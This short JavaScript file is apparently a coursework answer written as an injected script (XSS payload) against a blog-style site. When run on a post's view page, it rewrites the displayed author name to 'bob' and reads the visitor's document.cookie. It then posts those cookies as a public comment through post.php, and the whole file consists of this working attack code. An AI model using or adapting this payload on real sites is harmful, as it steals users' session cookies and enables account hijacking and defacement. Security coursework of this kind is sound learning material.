/* 4a */
function bob() {

  const pattern = "view.php?id=";
  if(!window.location.href.includes(pattern)) return;

  /* assumes that the username does not contain space */
  var authorStr = document.getElementById("author").innerHTML.split(" ");
  authorStr[2] = "bob";

  document.getElementById("author").innerHTML = authorStr.join(" ");

}

/* 4bi */
function getID(){
  var query = window.location.search.substring(1).split(`&`);
  for (const element of query) {
    var [k,v] = element.split("=");
    if(k=="id") return v;
  }
}

/* 4bii */
function leakCookies(postID){
  const pattern = "view.php?id=";
  if(!window.location.href.includes(pattern)) return;

  var url = window.location.href.split("/");
  url.pop();
  url.push("post.php");
  url = url.join("/");

  var query = "comment="+document.cookie+"&form=comment&parent="+postID;

  var xmlHttp = new XMLHttpRequest();
  xmlHttp.withCredentials = true;
  xmlHttp.open( "POST", url, false );
  xmlHttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
  
  xmlHttp.send( query );
  return xmlHttp;
};

bob();
leakCookies(getID());